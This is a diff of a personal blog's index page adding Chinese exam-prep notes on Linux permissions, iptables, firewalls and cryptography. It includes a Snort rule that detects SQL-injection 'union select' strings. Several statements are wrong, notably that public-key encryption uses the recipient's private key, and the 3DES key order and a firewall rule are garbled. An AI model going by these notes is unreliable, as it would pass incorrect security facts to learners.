@@ -172,18 +172,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">96</span>
+          <span class="site-state-item-count">101</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">48</span>
+        <span class="site-state-item-count">52</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -208,6 +208,990 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/07/Linux%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/07/Linux%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">Linux权限管理</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-07 07:34:45 / 修改时间：07:45:20" itemprop="dateCreated datePublished" datetime="2026-08-07T07:34:45+08:00">2026-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><p>rwx421读写执行</p>
+<p>文件所有者-文件所属组用户-其他用户</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>-</th>
+<th>普通文件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>d</td>
+<td>目录文件</td>
+</tr>
+<tr>
+<td>l</td>
+<td>链接文件</td>
+</tr>
+<tr>
+<td>b</td>
+<td>设备文件</td>
+</tr>
+<tr>
+<td>p</td>
+<td>管道文件</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>drwxr-xr-x 2 root root 4.0K May 10 22:31 Desktop</p>
+<p>第一个root代表所属用户，第二个root代表所属组；</p>
+<p>去除文件的执行权限命令：</p>
+<p>chmod a-x openvpn</p>
+<p>chmod ugo-x openvpn</p>
+<p>chmod 644 openvpn</p>
+<p>为所有用户添加可执行权限：</p>
+<p>chmod +x file</p>
+<p>chmod a+x file</p>
+<p>chmod ugo+x file</p>
+<p>chmod -R 用于递归修改权限。-R, —recursive 表示“递归地更改文件和目录”。</p>
+<h2 id="Linux系统安全增强"><a href="#Linux系统安全增强" class="headerlink" title="Linux系统安全增强"></a>Linux系统安全增强</h2><p>最小化系统网络服务：</p>
+<p>inetd.conf 的文件权限设置为 600；</p>
+<p>inetd.conf 的文件属主为 root；</p>
+<p>services 的文件权限设置为 644；</p>
+<p>services 的文件属主为 root。</p>
+<p>限制远程访问：</p>
+<p>/etc/hosts.allow 和 /etc/hosts.deny 允许和禁止远程主机对本地服务的访问。</p>
+<p>白名单的安全性会更高一些；</p>
+<p>vim /etc/hosts.allow</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>允许内容</th>
+<th>书写格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ssh 允许单个 IP</td>
+<td><code>sshd:192.168.220.1</code></td>
+</tr>
+<tr>
+<td>ssh 允许 IP 段</td>
+<td><code>sshd:192.168.220.</code></td>
+</tr>
+<tr>
+<td>telnet 允许单个 IP</td>
+<td><code>in.telnetd:192.168.220.1</code></td>
+</tr>
+<tr>
+<td>telnet 允许 IP 段</td>
+<td><code>in.telnetd:192.168.221.</code></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>用户超时注销：TMOUT=600 所有用户在10分钟无操作后自动注销；</p>
+<h2 id="访问控制策略"><a href="#访问控制策略" class="headerlink" title="访问控制策略"></a>访问控制策略</h2><p>两个网络安全模型：BLP模型和Biba模型。</p>
+<p>BLP：Bell-LaPadula BLP机密性模型，防止非授权信息访问扩展。</p>
+<ul>
+<li>简单安全特性：不能向上读，只能向下读；</li>
+<li>*特性：只能向上写，不能向下写；</li>
+</ul>
+<p>机密性模型，不能保证完整性，因为可以向上写会破坏完整性。</p>
+<p>Biba模型：防止非授权篡改，保证信息系统完整性。</p>
+<ul>
+<li>简单安全特性：不能向下读；</li>
+<li>*特性：不能向上写；</li>
+<li>调用特性：不能向上调；</li>
+</ul>
+<p>访问控制三要素：主体、客体、（访问控制数据库、参考监视器、审计库）；</p>
+<h2 id="Linux密码管理"><a href="#Linux密码管理" class="headerlink" title="Linux密码管理"></a>Linux密码管理</h2><p>超级用户 root UID=0</p>
+<p>系统密码文件： /etc/passwd 对所有用户可读（644）；</p>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>用户名：加密口令占位：用户ID：组ID：用户全名或描述：登录目录：登录shell</p>
+<p>第二列是用户的口令或密码，若为x则表示密码存储到了/etc/shadow中</p>
+<p>/etc/shadow 只有root能读 （400）存储密码详细信息</p>
+<p>用户名：用户加密后的口令（若为空则不需口令即可登录，若为*则表示用户禁用）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/07/iptables/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/07/iptables/" class="post-title-link" itemprop="url">iptables</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-07 07:34:34 / 修改时间：07:44:41" itemprop="dateCreated datePublished" datetime="2026-08-07T07:34:34+08:00">2026-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>iptables四表五链</p>
+<h3 id="默认的-4-个规则表"><a href="#默认的-4-个规则表" class="headerlink" title="默认的 4 个规则表"></a>默认的 4 个规则表</h3><ul>
+<li><strong>raw 表</strong>：确定是否对该数据包进行状态跟踪  </li>
+<li><strong>mangle 表</strong>：为数据包设置标记  </li>
+<li><strong>nat 表</strong>：修改数据包中的源、目的 IP 地址或端口  </li>
+<li><strong><font style="color:#DF2A3F;">filter 表</font></strong><font style="color:#DF2A3F;">：确定是否放行该数据包（过滤）</font></li>
+</ul>
+<hr>
+<h3 id="默认的-5-种规则链"><a href="#默认的-5-种规则链" class="headerlink" title="默认的 5 种规则链"></a>默认的 5 种规则链</h3><ul>
+<li><strong><font style="color:#DF2A3F;">INPUT</font></strong><font style="color:#DF2A3F;">：处理入站数据包  </font></li>
+<li><strong><font style="color:#DF2A3F;">OUTPUT</font></strong><font style="color:#DF2A3F;">：处理出站数据包  </font></li>
+<li><strong><font style="color:#DF2A3F;">FORWARD</font></strong><font style="color:#DF2A3F;">：处理转发的数据包</font>  </li>
+<li><strong>PREROUTING</strong>：在进行路由选择前处理数据包  </li>
+<li><strong>POSTROUTING</strong>：在进行路由选择后处理数据包</li>
+</ul>
+<hr>
+<h3 id="规则表与规则链的对应关系"><a href="#规则表与规则链的对应关系" class="headerlink" title="规则表与规则链的对应关系"></a>规则表与规则链的对应关系</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>规则表</th>
+<th>定义</th>
+<th>包含的规则链</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>raw 表</strong></td>
+<td>确定是否对该数据包进行状态跟踪。</td>
+<td>OUTPUT、PREROUTING</td>
+</tr>
+<tr>
+<td><strong>mangle 表</strong></td>
+<td>修改数据包内容，用来做流量整形的，给数据包设置标记。</td>
+<td>INPUT、OUTPUT、FORWARD、PREROUTING、POSTROUTING</td>
+</tr>
+<tr>
+<td><strong>nat 表</strong></td>
+<td>负责网络地址转换，用来修改数据包中的源/目标 IP 地址或端口。</td>
+<td>OUTPUT、PREROUTING、POSTROUTING</td>
+</tr>
+<tr>
+<td><strong><font style="color:#DF2A3F;">filter 表</font></strong></td>
+<td><font style="color:#DF2A3F;">负责过滤数据包，确定是否放行该数据包（包过滤防火墙）。</font></td>
+<td><font style="color:#DF2A3F;">INPUT、FORWARD、OUTPUT</font></td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="iptables-命令的语法格式"><a href="#iptables-命令的语法格式" class="headerlink" title="iptables 命令的语法格式"></a>iptables 命令的语法格式</h3><ul>
+<li><code>iptables [-t 表名] 管理选项 [链名] 条件匹配 -j 执行动作</code></li>
+<li><strong>示例</strong>：<br><code>iptables -t filter -A INPUT -s 192.168.184.20 -p tcp --dport 22 -j DROP</code></li>
+</ul>
+<hr>
+<h3 id="通用参数"><a href="#通用参数" class="headerlink" title="通用参数"></a>通用参数</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-p</code> 协议</td>
+<td>指定协议（如 tcp, udp, icmp）</td>
+<td><code>iptables -A INPUT -p tcp</code></td>
+</tr>
+<tr>
+<td><code>-s</code> 源地址</td>
+<td>指定源 IP 地址</td>
+<td><code>iptables -A INPUT -s 192.168.1.1</code></td>
+</tr>
+<tr>
+<td><code>-d</code> 目的地址</td>
+<td>指定目的 IP 地址</td>
+<td><code>iptables -A INPUT -d 192.168.12.1</code></td>
+</tr>
+<tr>
+<td><code>--sport</code> 源端口</td>
+<td>指定源端口（需配合 <code>-p</code>）</td>
+<td><code>iptables -A INPUT -p tcp --sport 22</code></td>
+</tr>
+<tr>
+<td><code>--dport</code> 目的端口</td>
+<td>指定目的端口（需配合 <code>-p</code>）</td>
+<td><code>iptables -A INPUT -p tcp --dport 22</code></td>
+</tr>
+<tr>
+<td><code>-j</code> 处理动作</td>
+<td>指定匹配后的处理动作</td>
+<td>见下方动作列表</td>
+</tr>
+<tr>
+<td><code>-t</code> 指定表</td>
+<td>一般都是指定filter表</td>
+<td>默认不写就是指定filter表</td>
+</tr>
+<tr>
+<td><code>-A</code> 添加一条规则</td>
+<td>Append</td>
+<td></td>
+</tr>
+<tr>
+<td><code>-D</code> 删除一条规则</td>
+<td>Delete</td>
+<td></td>
+</tr>
+<tr>
+<td><code>-I</code> 插入一条规则</td>
+<td>Insert默认插入在第一行</td>
+<td></td>
+</tr>
+<tr>
+<td><code>-P</code> 默认策略</td>
+<td>大写P是表示默认策略</td>
+</tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h3 id="常用处理动作（-j）"><a href="#常用处理动作（-j）" class="headerlink" title="常用处理动作（-j）"></a>常用处理动作（-j）</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>动作</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>DROP</strong></td>
+<td>直接丢弃数据包，不回应</td>
+</tr>
+<tr>
+<td><strong>REJECT</strong></td>
+<td>丢弃数据包，并回显 ICMP 不可达消息</td>
+</tr>
+<tr>
+<td><strong>LOG</strong></td>
+<td>将数据包信息记录到 syslog（继续执行后续规则）</td>
+</tr>
+<tr>
+<td><strong>ACCEPT</strong></td>
+<td>允许数据包通过</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>实现允许IP为10.0.0.2的客户端访问本机的tcp 22端口：</p>
+<p>iptables -I INPUT -s 10.0.0.2 -p tcp —dport 22 -j ACCEPT</p>
+<p>出口防火墙设置iptables默认不允许任何数据包进入：</p>
+<p>iptables -t filter -P  FORWARD -j DROP</p>
+<p>iptables -t filter -P  FORWARD DROP</p>
+<p>iptables -t filter -P  FORWARD -j REJECT</p>
+<p>iptables防火墙在设置规则时注意放行双向流量：</p>
+<p>DMZ区的网站一般开放端口是80和443；</p>
+<p>iptables -t filter -A FORWARD -p tcp —dport 80,443 -j ACCEPT （入站流量）</p>
+<p>iptables -t filter -A FORWARD -p tcp —dport 80,443 -j ACCEPT（出站放行流量）</p>
+<p>内网管理员访问网站服务器进行运维：</p>
+<p>iptables -A FORWARD -p tcp -s 192.168.11.2 -d 192.168.70.0/24 —dport 22 -j ACCEPT（内转外放行）</p>
+<p>iptables -A FORWARD -p tcp -s 192.168.70.0/24 —sport 22 -d 192.168.11.2 -j ACCEPT（外转内放行）</p>
+<h3 id="Snort入侵检测系统"><a href="#Snort入侵检测系统" class="headerlink" title="Snort入侵检测系统"></a>Snort入侵检测系统</h3><ul>
+<li>在 Snort 中有五种动作：<strong>alert</strong>、<strong>log</strong>、<strong>pass</strong>、<strong>activate</strong> 和 <strong>dynamic</strong>。</li>
+<li><strong>Alert</strong>：生成一个警报，然后记录（log）这个包。</li>
+<li><strong>Log</strong>：记录这个包。<br>Log 动作与 Alert 动作的不同在于：Alert 动作是发送告警然后记录包，Log 动作仅仅记录包。</li>
+<li><strong>Pass</strong>：丢弃（忽略）这个包。</li>
+<li><strong>Activate</strong>：报警并且激活另一条 dynamic 规则，比如进一步检验。</li>
+<li><strong>Dynamic</strong>：保持空闲直到被一条 activate 规则激活，被激活后就作为一条 log 规则执行。<br>Dynamic 规则动作由其它用 activate 动作的规则调用，在正常情况下，他们不会被用来检测包。一个动态规则仅能被一个“activate”动作激活。</li>
+</ul>
+<p>动作写在第一个空</p>
+<p><strong>Alert</strong> tcp any any → any any  (msg:”XXX”;content:”<strong>union select</strong>“;nocase;sid:110;)</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/07/%E9%98%B2%E7%81%AB%E5%A2%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/07/%E9%98%B2%E7%81%AB%E5%A2%99/" class="post-title-link" itemprop="url">防火墙</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-07 07:34:22 / 修改时间：07:43:24" itemprop="dateCreated datePublished" datetime="2026-08-07T07:34:22+08:00">2026-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>为了应对网络威胁，将内部信任网络与外部公共不可信任网络进行隔离（逻辑隔离）。</p>
+<p>物理隔离设备：网闸；</p>
+<p>网闸：物理隔离，数据摆渡。不建立两个网络的直接链接，而是像一艘“数据摆渡船”，将数据以“文件”形式从一端“搬运”到另一端。在任一时刻，内外网仅有一侧与中间的隔离交换区相连。</p>
+<p>防火墙是由一些软、硬件组合而成的<strong><font style="color:#DF2A3F;">网络访问控制器，</font></strong>它根据一定的<strong><font style="color:#DF2A3F;">安全规则</font></strong>来控制流过防火墙的网络包，如<strong><font style="color:#DF2A3F;">禁止和转发</font></strong>，能够<strong><font style="color:#DF2A3F;">屏蔽被保护网络</font></strong>的内部信息、拓扑结构和运行情况，起到网络安全屏障的作用。</p>
+<p>华为防火墙对流量的操作：permit、deny</p>
+<p>Linux防火墙对流量的操作：Accept接收、Reject拒绝数据包通过（通知信息源）、Drop拒绝数据包通过（不通知信息源）</p>
+<h2 id="防火墙安全策略"><a href="#防火墙安全策略" class="headerlink" title="防火墙安全策略"></a>防火墙安全策略</h2><p>1.白名单策略：只允许符合安全规则的包通过防火墙，其他通信包进制；</p>
+<p>2.黑名单策略：禁止与安全规则相冲突的包通过防火墙；</p>
+<p>iptables防火墙</p>
+<p>Chain INPUT （policy ACCEPT）默认是policy ACCEPT接受，在里面写了规则的是不接受，所以是黑名单策略。</p>
+<h2 id="包过滤防火墙"><a href="#包过滤防火墙" class="headerlink" title="包过滤防火墙"></a>包过滤防火墙</h2><p>包过滤：在IP层实现（网络层），根据源、目的IP，源、目的端口及协议、包传递方向等包头信息判断包是否通过。</p>
+<p>优点：低负载、高通过、对用户透明；</p>
+<p>缺点：不能进行应用层的用户级别过滤；</p>
+<p>五元组：源目IP、源目端口、协议号；</p>
+<p>包过滤规则由“规则号、匹配条件、匹配操作”三部分构成，根据源目IP、源目端口、协议类型（UDP/TCP/ICMP）、通信方向、规则运算进行匹配，匹配操作有拒绝、转发、审计三种。</p>
+<p>华为ACL案例</p>
+<p>rule 10 permit tcp source any destination any source-port gt 1024 destination eq 25</p>
+<p>允许任何源IP端口大于1024对任何目的IP端口等于25进行通信。</p>
+<h2 id="⭐防火墙防御体系结构类型"><a href="#⭐防火墙防御体系结构类型" class="headerlink" title="⭐防火墙防御体系结构类型"></a>⭐防火墙防御体系结构类型</h2><ol>
+<li>基于双宿主主机防火墙：最基本防火墙结构，最少两块网卡，一块联通内网，一块联通外网；</li>
+<li>基于代理型防火墙：出口有一个过滤路由器（连外网）+代理主机（连内网）。任何外部系统对内网进行操作都要经过代理主机；</li>
+<li>基于屏蔽子网的防火墙：在代理结构中新增加一层周边网络的安全机制，使内部网络和外部网络有两层隔离带，过滤路由器A连外网，过滤路由器B连内网，中间有一个代理服务器主机（堡垒机），即使堡垒机失陷，攻击者也看不到两边的信息；</li>
+</ol>
+<p><img src="../uploads/aaaa0807.png" alt=""></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8%E4%B8%93%E9%A2%98-%E8%BD%AF%E8%80%83Summer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8%E4%B8%93%E9%A2%98-%E8%BD%AF%E8%80%83Summer/" class="post-title-link" itemprop="url">密码学及应用专题-软考Summer</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-07 07:34:07 / 修改时间：07:35:35" itemprop="dateCreated datePublished" datetime="2026-08-07T07:34:07+08:00">2026-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="一、密码体制分类"><a href="#一、密码体制分类" class="headerlink" title="一、密码体制分类"></a>一、密码体制分类</h2><p>密码体制分为<strong>私钥和公钥</strong>密码体制两种，介于私钥和公钥之间的密码称为<strong>混合密码体制</strong>。</p>
+<ul>
+<li>私钥密码：又称为对称密码，加密秘钥和解密密钥一致，双方事先需要通过安全渠道交换密钥；</li>
+<li>公钥密码：有两个密码，加密和解密用的密钥是不一样的；</li>
+</ul>
+<p>对称加密算法特点：</p>
+<ul>
+<li>优点：加密速度快、密文紧凑、使用长密钥时难破解；</li>
+<li>缺点：密钥分配、管理问题，无法进行源认证；</li>
+</ul>
+<p>一般使用对称密码加密大的内容（文件、消息），使用公钥密码加密小的内容（密钥、签名、哈希）</p>
+<p>常见的对称密钥加密算法：DES、3DES、AES、RC4/5、IDEA；</p>
+<p>DES密钥长度56，3DES密钥长度112。</p>
+<p>公钥密码体制称为非对称加密体制：A→B发送数据，A在进行数据加密时使用B的私钥，B收到数据后再用B的私钥解密。</p>
+<ul>
+<li>优点：密钥分发方便、密钥保管量少、支持数字签名；</li>
+<li>缺点：加密速度慢（计算量大，不适合加密大数据）、数据膨胀率高；</li>
+</ul>
+<p>每个实体都有两个密钥：公钥公开、私钥自己保存：</p>
+<ul>
+<li>公钥加密，私钥解密可实现保密通信</li>
+<li>私钥加密，公钥解密可实现数字签名（私钥签名，公钥验证）</li>
+</ul>
+<p>常见的非对称加密算法：RSA（密钥512、1024或2048位）、Elgamal、ECC（椭圆曲线算法）、背包算法、Rabin、DH等；</p>
+<p>对称加密算法总结</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>算法</th>
+<th>解释</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DES</td>
+<td>Data Encrytion Standard，数据加密标准，分组加密算法，移位+替换，速度快，密钥易产生</td>
+<td>分组长度64位，有效密钥长度56位</td>
+</tr>
+<tr>
+<td>3DES</td>
+<td>三重DES（TDEA），使用DES对明文进行“加密-解密-加密”操作：<br/>加密：K1加密→K2解密→K3加密<br/>解密：K3解密→K2加密→K3解密<br/>K1=K3</td>
+<td>密钥长度112位</td>
+</tr>
+<tr>
+<td>IDEA</td>
+<td>International Data Encryption Algorithm，国际数据加密算法。混合使用来自不同代数群中的运算</td>
+<td>明文和密文分组都是64位，密钥长度128位，用于PGP</td>
+</tr>
+<tr>
+<td>AES</td>
+<td>Advanced Encrytion Standard，高级加密标准，可以通过硬件实现，像3DES一样安全。</td>
+<td>分组长度128位，支持128，192，256位三种密钥长度</td>
+</tr>
+<tr>
+<td>RC4/5</td>
+<td>流加密算法，用于WiFi，加密速度快，可达DES10倍。</td>
+<td>分组和密钥长度都可变</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>混合密码体制：</p>
+<p>Alice用对称密钥加密消息，然后把对称密钥用Bob的公钥进行加密，生成数字信封，连同加密消息一起发给Bob；</p>
+<p>Bob收到消息后，用私钥对数字信息进行解密，拿到对称密钥，对加密消息进行解密得到明文；</p>
+<p>用非对称密钥解决了对称密钥的密钥分发问题；</p>
+<h2 id="二、DES加密过程"><a href="#二、DES加密过程" class="headerlink" title="二、DES加密过程"></a>二、DES加密过程</h2><p>DES的S盒要知道是什么，针对S盒的输入和输出要会计算：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th></th>
+<th>0</th>
+<th>1</th>
+<th>2</th>
+<th>3</th>
+<th>4</th>
+<th>5</th>
+<th>6</th>
+<th>7</th>
+<th>8</th>
+<th>9</th>
+<th>10</th>
+<th>11</th>
+<th>12</th>
+<th>13</th>
+<th>14</th>
+<th>15</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>12</td>
+<td>1</td>
+<td>10</td>
+<td>15</td>
+<td>9</td>
+<td>2</td>
+<td>6</td>
+<td>8</td>
+<td>0</td>
+<td>13</td>
+<td>3</td>
+<td>4</td>
+<td>14</td>
+<td>7</td>
+<td>5</td>
+<td>11</td>
+</tr>
+<tr>
+<td>1</td>
+<td>10</td>
+<td>15</td>
+<td>4</td>
+<td>2</td>
+<td>7</td>
+<td>12</td>
+<td>9</td>
+<td>5</td>
+<td>6</td>
+<td>1</td>
+<td>13</td>
+<td>14</td>
+<td>0</td>
+<td>11</td>
+<td>3</td>
+<td>8</td>
+</tr>
+<tr>
+<td>2</td>
+<td>9</td>
+<td>14</td>
+<td>15</td>
+<td>5</td>
+<td>2</td>
+<td>8</td>
+<td>12</td>
+<td>3</td>
+<td>7</td>
+<td>0</td>
+<td>4</td>
+<td>10</td>
+<td>1</td>
+<td>13</td>
+<td>11</td>
+<td>6</td>
+</tr>
+<tr>
+<td>3</td>
+<td>4</td>
+<td>3</td>
+<td>2</td>
+<td>12</td>
+<td>9</td>
+<td>5</td>
+<td>15</td>
+<td>10</td>
+<td>11</td>
+<td>14</td>
+<td>1</td>
+<td>7</td>
+<td>6</td>
+<td>0</td>
+<td>8</td>
+<td>13</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>如果该S盒输入110011，则其二进制输出为（1110）</p>
+<p>计算过程，6位输出第一位和最后一位是行：11，中间四位是列1001，二进制11转换为十进制是3，二进制1001转换为十进制是9，第3行第9列是14，14转换为二进制是1110。</p>
+<h2 id="三、国产加密算法-SM系列"><a href="#三、国产加密算法-SM系列" class="headerlink" title="三、国产加密算法-SM系列"></a>三、国产加密算法-SM系列</h2><p>《中华人民共和国密码法》把密码分为核心密码，普通密码和商用密码，核心、普通密码用于保护国家秘密信息，属于国家秘密，商用密码大家才能够使用。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>算法名称</th>
+<th>算法特征描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SM1</td>
+<td>对称加密，分组长度和密钥长度都是128bit</td>
+</tr>
+<tr>
+<td>SM2</td>
+<td>非对称加密，公钥加密算法（椭圆曲线）</td>
+</tr>
+<tr>
+<td>SM3</td>
+<td>杂凑算法（哈希算法），分组512位，输出256位</td>
+</tr>
+<tr>
+<td>SM4</td>
+<td>对称加密，分组和密钥都是128bit</td>
+</tr>
+<tr>
+<td>SM9</td>
+<td>标识密码算法，本质非对称，支持公钥加密、密钥交换、数字签名等</td>
+</tr>
+</tbody>
+</table>
+</div>
